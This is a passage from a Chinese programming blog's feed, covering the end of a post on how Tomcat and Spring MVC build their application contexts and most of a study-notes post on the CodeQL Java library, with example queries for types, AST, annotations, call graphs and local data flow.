WebApplicationContext”了</p><p>一路跟下来，我们知道context其实是tomcat内部的ApplicationContextFacade对象被Spring包装为自己的XmlWebApplicationContext对象了。</p><p>并且作为“Root WebApplicationContext”，是<strong>唯一的</strong>。</p><img src="../images/Context%E7%90%90%E4%BA%8B/image-20211208133818738.png" alt="image-20211208133818738" style="zoom:50%;"><p>ok继续向下看，parent为null，进入configureAndRefreshWebApplicationContext方法：</p><p><img src="../images/Context%E7%90%90%E4%BA%8B/image-20211208134602540.png" alt="image-20211208134602540"></p><p>之后挑重点说：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">configureAndRefreshWebApplicationContext</span>()</span><br><span class="line"><span class="selector-tag">wac</span><span class="selector-class">.refresh</span>();</span><br></pre></td></tr></table></figure><p><img src="../images/Context%E7%90%90%E4%BA%8B/image-20211208145335211.png" alt="image-20211208145335211"></p><p>contextConfigLocation是要告诉ContextLoaderListener要把哪些Bean注入到XmlWebApplicationContext管理的BeanFactory。</p><img src="../images/Context%E7%90%90%E4%BA%8B/image-20211208135135541.png" alt="image-20211208135135541" style="zoom:50%;"><p>refresh才开始真正初始化组件。</p><p>总结：</p><p>我们在SpringMVC工程中配置好的web.xml中的listener类型ContextLoaderListener，会监听Web容器(tomcat)的初始化事件。ContextLoaderListener的contextInitialized方法中，Spring会将tomcat中唯一的ApplicationContextFacade对象包装为XMLWebApplicationContext对象并标识为全局唯一的Spring根容器”ROOT WebApplicationContext”。</p><h2 id="融合"><a href="#融合" class="headerlink" title="融合"></a>融合</h2><p>当我们完成bean初始化之后，还是要回到最开始的initWebApplicationContext方法</p><img src="../images/Context%E7%90%90%E4%BA%8B/image-20211208142522728.png" alt="image-20211208142522728" style="zoom:50%;"><p>是的你没有看错，二者凭借成员属性“融合”到一起了。</p><p>Spring的Web应用上下文和Web容器的上下文应用就可以实现互访，二者实现了“融合”。我中有你，你中有我！</p><img src="../images/Context%E7%90%90%E4%BA%8B/image-20211208143331833.png" alt="image-20211208143331833" style="zoom:50%;"><p>总而言之，Servlet规范中ServletContext实现(ApplicationContext)是tomcat的Context实现(StandardContext)的一个成员变量，而Spring的ApplicationContext是Servlet规范中ServletContext的一个属性。</p><h1 id="DispatcherServlet"><a href="#DispatcherServlet" class="headerlink" title="DispatcherServlet"></a>DispatcherServlet</h1><img src="../images/Context%E7%90%90%E4%BA%8B/image-20211208151715828.png" alt="image-20211208151715828" style="zoom:50%;"><p>DispatcherServlet的本质是Servlet，是前端控制器。</p><img src="../images/Context%E7%90%90%E4%BA%8B/image-20211208151913908.png" alt="image-20211208151913908" style="zoom:50%;"><p>但是既然本质是Servlet，初始化还是要走init方法的。</p><p>还记得tomcat中的StandardContext.startInternal方法：</p><img src="../images/Context%E7%90%90%E4%BA%8B/image-20211208152332597.png" alt="image-20211208152332597" style="zoom:50%;"><p>进入loadOnStartup方法：</p><img src="../images/Context%E7%90%90%E4%BA%8B/image-20211208152422016.png" alt="image-20211208152422016" style="zoom:50%;"><p>注释已经写的很清楚了，加载那些loadonstartup=1的Servlet</p><p>现在tomcat准备加载DispatcherServlet对象，要去寻找init方法</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GenericServlet (javax.servlet)</span><br><span class="line">    HttpServlet (javax.servlet.http)</span><br><span class="line">        HttpServletBean (org.springframework.web.servlet)</span><br><span class="line">            FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">                DispatcherServlet (org.springframework.web.servlet)</span><br></pre></td></tr></table></figure><p>在HttpServletBean找到了init方法</p><img src="../images/Context%E7%90%90%E4%BA%8B/image-20211208165433964.png" alt="image-20211208165433964" style="zoom:50%;"><p>发现调用的是FrameworkServlet类的initServletBean方法：</p><img src="../images/Context%E7%90%90%E4%BA%8B/image-20211208165719017.png" alt="image-20211208165719017" style="zoom:50%;"><p>进入initWebApplicationContext方法：</p><img src="../images/Context%E7%90%90%E4%BA%8B/image-20211208170748959.png" alt="image-20211208170748959" style="zoom:50%;"><p>这里创建的是特定Servlet拥有的子IoC容器</p><p><code>根IoC容器</code>做为全局共享的<code>IoC容器</code>放入Web应用需要共享的<code>Bean</code>，而<code>子IoC容器</code>根据需求的不同，放入不同的<code>Bean</code>，这样能够做到隔离，保证系统的安全性。</p><p><img src="../images/Context%E7%90%90%E4%BA%8B/image-20211208173014765.png" alt="image-20211208173014765"></p><p>返回子容器</p><img src="../images/Context%E7%90%90%E4%BA%8B/image-20211208173238331.png" alt="image-20211208173238331" style="zoom:50%;"><p>当IoC子容器构造完成后调用了onRefresh()方法，具体实现由子类覆盖，调用onRefresh()方法时将前文创建的IoC子容器作为参数传入，DispatcherServletBean类的onRefresh()初始化配置一堆<strong>组件</strong></p><img src="../images/Context%E7%90%90%E4%BA%8B/image-20211208173554027.png" alt="image-20211208173554027" style="zoom:50%;"><h1 id="SpringMVC-启动流程"><a href="#SpringMVC-启动流程" class="headerlink" title="SpringMVC 启动流程"></a>SpringMVC 启动流程</h1><ol><li>tomcat会读取项目web.xml中的<code>&lt;context-param&gt;</code>内容、<code>&lt;listener&gt;</code>标签、<code>filter</code>标签。</li><li>tomcat会读取项目的web.xml中的<code>&lt;listener&gt;</code>，如果配置了listener为ContextLoaderListener，那么就创建父容器ROOT，与tomcat的ApplicationContextFacade“融合”。</li><li>读取<code>servlet</code>标签，一般是DispatchServlet</li><li>为DispatchServlet创建子容器</li><li>读取<code>&lt;servlet&gt;</code>标签的<code>&lt;init-param&gt;</code>配置的<code>xml文件</code>并加载相关<code>Bean</code></li><li>onfresh方法创建SpringMVC的组件</li></ol><img src="../images/Context%E7%90%90%E4%BA%8B/image-20211208175553011.png" alt="image-20211208175553011" style="zoom:50%;"><p><strong>每个具体的 DispatcherServlet 创建的是一个 Child Context，代表一个独立的 IoC 容器；</strong></p><p> <strong>ContextLoaderListener 所创建的是一个 Root Context，代表全局唯一的一个公共 IoC 容器。</strong></p><h1 id="四种方式获取当前容器"><a href="#四种方式获取当前容器" class="headerlink" title="四种方式获取当前容器"></a>四种方式获取当前容器</h1><p>现在这句话应该可以清晰了:</p><p>WebApplicationContext是专门为web应用准备的，从WebApplicationContext中可以获得ServletContext的引用。</p><p>同时，整个Web应用上下文对象将作为域对象属性放置在Web容器的facade中，以便Web应用可以访问spring上下文。</p><img src="../images/Context%E7%90%90%E4%BA%8B/image-20211208143204632.png" alt="image-20211208143204632" style="zoom:50%;"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ROOT XmlWebApplicationContext</span></span><br><span class="line">WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();</span><br><span class="line"></span><br><span class="line"><span class="comment">// ROOT XmlWebApplicationContext</span></span><br><span class="line">WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());</span><br><span class="line"></span><br><span class="line"><span class="comment">// Child WebApplicationContext dispatcherServlet-servlet</span></span><br><span class="line">WebApplicationContext context = RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());</span><br><span class="line"></span><br><span class="line"><span class="comment">// Child WebApplicationContext dispatcherServlet-servlet</span></span><br><span class="line">WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">"org.springframework.web.servlet.DispatcherServlet.CONTEXT"</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><img src="../images/Context%E7%90%90%E4%BA%8B/image-20211208181647515.png" alt="image-20211208181647515" style="zoom:50%;"><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.jianshu.com/p/dc64d02e49ac" target="_blank" rel="noopener">SpringMVC 启动流程及相关源码分析</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;去年花里逢君别，今年花开又一年。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;对JavaWeb中Context的学习，设计模式yyds。&lt;/p&gt;
    
    </summary>
    
    
      <category term="JavaWeb" scheme="https://fynch3r.github.io/categories/JavaWeb/"/>
    
    
      <category term="Servlet" scheme="https://fynch3r.github.io/tags/Servlet/"/>
    
  </entry>
  
  <entry>
    <title>CodeQL学习笔记(四)</title>
    <link href="https://fynch3r.github.io/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%9B%9B/"/>
    <id>https://fynch3r.github.io/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%9B%9B/</id>
    <published>2021-10-29T07:08:17.000Z</published>
    <updated>2022-03-11T01:40:18.009Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>春风不相识，何事入罗帏。</p></blockquote><p>CodeQL for Java。<a href="https://codeql.github.com/docs/codeql-language-guides/codeql-for-java/" target="_blank" rel="noopener">官方文档对应章节</a></p><a id="more"></a><h2 id="CodeQL-Library-for-Java"><a href="#CodeQL-Library-for-Java" class="headerlink" title="CodeQL Library for Java"></a>CodeQL Library for Java</h2><p>最重要的五类Library：</p><ol><li>程序元素：例如class , method</li><li>描述<strong>AST</strong>节点：例如statement , expression</li><li>描述元数据metadata：例如 注解annotation 注释</li><li>计算指标的类： 例如 cyclomatic complexity and coupling 例如圈复杂度和耦合程度</li><li>Classes for navigating the program’s <strong>call graph</strong></li></ol><h3 id="程序元素Program-element"><a href="#程序元素Program-element" class="headerlink" title="程序元素Program element"></a>程序元素Program element</h3><p>为了表示class和method，QL提供了如下类：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Element</span><br><span class="line">├── Package</span><br><span class="line">├── CompilationUnit</span><br><span class="line">├── Type</span><br><span class="line">├── Method</span><br><span class="line">├── Constructor</span><br><span class="line">└── Variable</span><br></pre></td></tr></table></figure><p><code>Callable</code>类，它是<code>Method</code>和<code>Constructor</code>类的公共父类。</p><h4 id="Type"><a href="#Type" class="headerlink" title="Type"></a>Type</h4><p>拥有很多子类：</p><ul><li>PrimitiveType ：描述Java语言中的8个基础类型 boolean byte char double float int long short 外带null+void</li><li>RefType：引用类型（也就是非基础类型），拥有如下子类：<ul><li>Class ： 类Class</li><li>Interface：接口</li><li>EnumType：枚举</li><li>Array：数组</li><li>TopLevelType：表示在编译单元顶层声明的类型 （声明类型）</li><li>NestedType：在一个type内部声明的type</li><li>TopLevelClass：表示在编译单元顶层声明的类</li><li>NestedType：在另一个type中声明的类<ul><li>LocalClass：在一个method或者constructor中定义的类</li><li>AnonymousClass：匿名类</li></ul></li></ul></li></ul><p>查询程序中的所有int类型的变量：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line">from Variable v, PrimitiveType pt</span><br><span class="line">where pt&#x3D;v.getType() and</span><br><span class="line">pt.hasName(&quot;int&quot;)</span><br><span class="line">select v</span><br></pre></td></tr></table></figure><p>查询所有的声明类型和编译类型不同的类型：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line">from TopLevelType tl</span><br><span class="line">where tl.getName() !&#x3D; tl.getCompilationUnit().getName()</span><br><span class="line">select tl</span><br></pre></td></tr></table></figure><p>还有很多其他单例类：</p><p><code>TypeObject</code>, <code>TypeCloneable</code>, <code>TypeRuntime</code>, <code>TypeSerializable</code>, <code>TypeString</code>, <code>TypeSystem</code> and <code>TypeClass</code>.</p><p>查询程序中的所有直接extends了Object类的嵌套类；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from NestedClass nc</span><br><span class="line">where nc.getASupertype() instanceof TypeObject</span><br><span class="line">select nc</span><br></pre></td></tr></table></figure><h5 id="泛型Genetics"><a href="#泛型Genetics" class="headerlink" title="泛型Genetics"></a>泛型Genetics</h5><p>CodeQL设计了若干个Type子类负责处理Java中的泛型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GenericType</span><br><span class="line">├── GenericInterface &#x2F;&#x2F; 泛型接口</span><br><span class="line">└── GenericClass &#x2F;&#x2F; 泛型类</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">package java.util.;</span><br><span class="line"></span><br><span class="line">public interface Map&lt;K, V&gt; &#123;</span><br><span class="line">    int size();</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>TypeVariable</code> 可以表示Map泛型接口中的K,V参数</p><p>如果现在有一个泛型类实现了Map泛型接口，<code>Map&lt;String, File&gt;</code> 的类型是<code>ParameterizedType</code></p><p>寻找那些原形是Map的泛型类：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from GenericInterface map, ParameterizedType pt</span><br><span class="line">where map.hasQualifiedName(&quot;java.util&quot;, &quot;Map&quot;) and</span><br><span class="line">    pt.getSourceDeclaration() &#x3D; map</span><br><span class="line">select pt</span><br></pre></td></tr></table></figure><p>但是通常泛型参数的类型会限制泛型类：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class StringToNumMap&lt;N extends Number&gt; implements Map&lt;String, N&gt; &#123;</span><br><span class="line">    &#x2F;&#x2F; ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>限制了N的类型一定是Number类自身或者Number的子类，可以说Number类是N的upper bound。</p><p>getATypeBound：返回参数的type bound</p><p>TypeBound：type bound</p><p>举例，查询泛型类中的参数bound是Number的参数变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from TypeVariable tv, TypeBound tb</span><br><span class="line">where tb &#x3D; tv.getATypeBound() and</span><br><span class="line">    tb.getType().hasQualifiedName(&quot;java.lang&quot;, &quot;Number&quot;)</span><br><span class="line">select tv</span><br></pre></td></tr></table></figure><p>当处理未知泛型类型的遗留代码，每个泛型type都是一个raw version 没有任何类形参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RawType</span><br><span class="line">├── RawClass</span><br><span class="line">└── RawInterface</span><br></pre></td></tr></table></figure><p>同样有谓词<code>getSourceDeclaration</code>方法来获得对应的泛型类型。</p><p>例如我们寻找Map的泛型类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line">from Variable v, RawType rt</span><br><span class="line">where rt &#x3D; v.getType() and </span><br><span class="line">rt.getSourceDeclaration().hasQualifiedName(&quot;java.util&quot;, &quot;Map&quot;)</span><br><span class="line">select v</span><br></pre></td></tr></table></figure><img src="../images/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%9B%9B/image-20211029175310396.png" alt="image-20211029175310396" style="zoom:50%;"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Map m1 &#x3D; new HashMap();</span><br><span class="line">Map&lt;String, String&gt; m2 &#x3D; new HashMap&lt;String, String&gt;();</span><br></pre></td></tr></table></figure><p>但是只能找到m1，不能找到m2。</p><p>RawType不带任何参数，比如说Map</p><p>通配符？：wildcard type</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;? extends Number, ? super Float&gt; m;</span><br></pre></td></tr></table></figure><p><code>WildcardTypeAccess</code>：表示的是这两个通配符<code>? extends Number</code>和<code>? super Float</code></p><p>Number是上界，Float是下届</p><p><code>getUpperBound</code>：获取上界</p><p><code>getLowerBound</code>：获取下界</p><p>当处理正常method的时候，</p><p><code>GenericMethod</code> ，<code>ParameterizedMethod</code>， <code>RawMethod</code>这三个类都能适用于常规方法。</p><h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><ul><li>Filed 代表Java类属性</li><li>LocalVariableDecl 代表局部变量</li><li>Parameter 代表方法（method, constructor）参数</li></ul><h3 id="AST-：Abstract-syntax-tree"><a href="#AST-：Abstract-syntax-tree" class="headerlink" title="AST ：Abstract syntax tree"></a>AST ：Abstract syntax tree</h3><p>AST中节点的成分，主要两类：</p><ul><li>Stmt：语句</li><li>Expr：表达式</li></ul><p>这两个类中也提供了一些成员谓词：</p><ul><li><code>Expr.getAChildExpr</code> 返回一个当前表达式的子表达式</li><li><code>Stmt.getAChild</code> 返回直接嵌套在给定语句中的语句或者表达式</li><li><code>Expr.getParent</code> and <code>Stmt.getParent</code>  返回一个AST节点的父节点</li></ul><p>返回return stmt中的表达式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line">from Expr e</span><br><span class="line">where e.getParent() instanceof ReturnStmt</span><br><span class="line">select e</span><br></pre></td></tr></table></figure><p>返回If stmt中的表达式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from Stmt s</span><br><span class="line">where s.getParent() instanceof IfStmt</span><br><span class="line">select s</span><br></pre></td></tr></table></figure><p>这样会将if语句的then和else都找到。</p><p>返回所有方法体中的语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line">from Stmt s</span><br><span class="line">where s.getParent() instanceof Method</span><br><span class="line">select s</span><br></pre></td></tr></table></figure><p>Method-Stmt-Expr</p><p>CodeQL提供了两个类：<code>ExprParent</code> 和 <code>StmtExpr</code></p><p>来表示Expr和Stmt的父节点</p><h3 id="元数据-Metadata"><a href="#元数据-Metadata" class="headerlink" title="元数据 Metadata"></a>元数据 Metadata</h3><p>元数据：描述数据的数据</p><p>Java语言有7种元数据，最出名的就是注解了（Annotation）。</p><p>CodeQL提供<code>Annotatable</code>类，作为所有可以被添加注解的程序元素的父类。例如：package、引用类型、field、method、constructor、local variable declaration。</p><p><code>Annotatable</code>类的谓词<code>getAnAnnotation</code>可以返回程序元素被添加的注解信息。</p><p>当然，Annotation类的类型就是AnnotationType：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from Constructor c, Annotation ann, AnnotationType anntp</span><br><span class="line">where ann &#x3D; c.getAnAnnotation() and</span><br><span class="line">    anntp &#x3D; ann.getType() and</span><br><span class="line">    anntp.hasQualifiedName(&quot;java.lang&quot;, &quot;Deprecated&quot;)</span><br><span class="line">select ann</span><br></pre></td></tr></table></figure><p>返回private字段的JavaDoc注释内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from Field f, Javadoc jdoc</span><br><span class="line">where f.isPrivate() and</span><br><span class="line">    jdoc &#x3D; f.getDoc().getJavadoc()</span><br><span class="line">select jdoc</span><br></pre></td></tr></table></figure><p>JavaDoc将注释内容解析为<code>JavadocElement</code>节点树，可以使用成员谓词<code>getAChild</code> 和<code>getParent</code> 进行查询。</p><p>寻找@author标注在private字段的标签。</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import <span class="keyword">java</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">from </span>Field f, <span class="keyword">Javadoc </span><span class="keyword">jdoc, </span>AuthorTag <span class="built_in">at</span></span><br><span class="line">where f.isPrivate() <span class="keyword">and</span></span><br><span class="line"><span class="keyword"> </span>   <span class="keyword">jdoc </span>= f.getDoc().getJavadoc() <span class="keyword">and</span></span><br><span class="line"><span class="keyword"> </span>   <span class="built_in">at</span>.getParent+() = <span class="keyword">jdoc</span></span><br><span class="line"><span class="keyword">select </span><span class="built_in">at</span></span><br></pre></td></tr></table></figure><h3 id="调用图-Call-Graph"><a href="#调用图-Call-Graph" class="headerlink" title="调用图 Call Graph"></a>调用图 Call Graph</h3><p>类Call可以代表method call、new expr、cons中的this or super。</p><p>A Callable 代表一个 method or constructor。</p><p>For example, the following query finds all calls to methods called <code>println</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from Call c, Method m</span><br><span class="line">where m &#x3D; c.getCallee() and</span><br><span class="line">    m.hasName(&quot;println&quot;)</span><br><span class="line">select c</span><br></pre></td></tr></table></figure><p>相反的，<code>Callable.getAReference</code>返回一个Call。</p><p>比如找到那些从来没有被调用的cons和methods。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line">from Callable c</span><br><span class="line">where not exists(c.getAReference())</span><br><span class="line">select c</span><br></pre></td></tr></table></figure><h2 id="Analyzing-data-flow-in-Java"><a href="#Analyzing-data-flow-in-Java" class="headerlink" title="Analyzing data flow in Java"></a>Analyzing data flow in Java</h2><p>local data flow / global data flow / taint tracking </p><h3 id="Local-data-flow"><a href="#Local-data-flow" class="headerlink" title="Local data flow"></a>Local data flow</h3><p>方法内的数据流分析。</p><p>CodeQL为局部数据流分析提供的模块是<code>DataFlow</code>。</p><p><code>DataFlow</code>模块定义了<code>Node</code>类，表示数据可以流经的类。</p><p><code>Node</code>最常用的两个子类是<code>ExprNode</code>和<code>ParameterNode</code>。</p><p> You can map between data flow nodes and expressions/parameters using the member predicates <code>asExpr</code> and <code>asParameter</code>:</p><p>可以在数据流节点和表达式/参数之间进行映射：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">class Node &#123;</span><br><span class="line">  &#x2F;** Gets the expression corresponding to this node, if any. *&#x2F;</span><br><span class="line">  Expr asExpr() &#123; ... &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;** Gets the parameter corresponding to this node, if any. *&#x2F;</span><br><span class="line">  Parameter asParameter() &#123; ... &#125;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * Gets the node corresponding to expression &#96;e&#96;.</span><br><span class="line"> *&#x2F;</span><br><span class="line">ExprNode exprNode(Expr e) &#123; ... &#125;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * Gets the node corresponding to the value of parameter &#96;p&#96; at function entry.</span><br><span class="line"> *&#x2F;</span><br><span class="line">ParameterNode parameterNode(Parameter p) &#123; ... &#125;</span><br></pre></td></tr></table></figure><p>如果数据流直接在两个node之间传递，谓词<code>localFlowStep</code>派上用途。</p><p>可以用闭包来使用：<code>localFlowStep*</code> 或者迭代使用谓词<code>localFlow</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * Holds if data can flow in one local step from &#96;node1&#96; to &#96;node2&#96;.</span><br><span class="line"> *&#x2F;</span><br><span class="line">private predicate localFlowStep(NodeEx node1, NodeEx node2, Configuration config) &#123;</span><br><span class="line">  exists(Node n1, Node n2 |</span><br><span class="line">    node1.asNode() &#x3D; n1 and</span><br><span class="line">    node2.asNode() &#x3D; n2 and</span><br><span class="line">    simpleLocalFlowStepExt(n1, n2) and</span><br><span class="line">    not outBarrier(node1, config) and</span><br><span class="line">    not inBarrier(node2, config) and</span><br><span class="line">    not fullBarrier(node1, config) and</span><br><span class="line">    not fullBarrier(node2, config)</span><br><span class="line">  )</span><br><span class="line">  or</span><br><span class="line">  exists(Node n |</span><br><span class="line">    config.allowImplicitRead(n, _) and</span><br><span class="line">    node1.asNode() &#x3D; n and</span><br><span class="line">    node2.isImplicitReadNode(n, false)</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>source -&gt; sink 模板：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DataFlow::localFlow(DataFlow::parameterNode(source), DataFlow::exprNode(sink))</span><br></pre></td></tr></table></figure><h4 id="Local-taint-tracking"><a href="#Local-taint-tracking" class="headerlink" title="Local taint tracking"></a>Local taint tracking</h4><p>模块：<code>TaintTracking</code></p><p>谓词：<code>localTaintStep</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localTaintStep(DataFlow::Node nodeFrom, DataFlow::Node nodeTo)</span><br></pre></td></tr></table></figure><p>迭代使用谓词：<code>localTaint</code> 或者直接上闭包<code>localTaintStep*</code></p><p>模板：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TaintTracking::localTaint(DataFlow::parameterNode(source), DataFlow::exprNode(sink))</span><br></pre></td></tr></table></figure><h4 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h4><p>寻找流向<code>new FileReader(..)</code>的fileName，也就是第0个参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from Constructor fileReader, Call call</span><br><span class="line">where</span><br><span class="line">  fileReader.getDeclaringType().hasQualifiedName(&quot;java.io&quot;, &quot;FileReader&quot;) and</span><br><span class="line">  call.getCallee() &#x3D; fileReader</span><br><span class="line">select call.getArgument(0)</span><br></pre></td></tr></table></figure><p>上面只能找到参数中的表达式，找不到数据流的流向关系。</p><p>附加上本地数据流，具体了一些：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 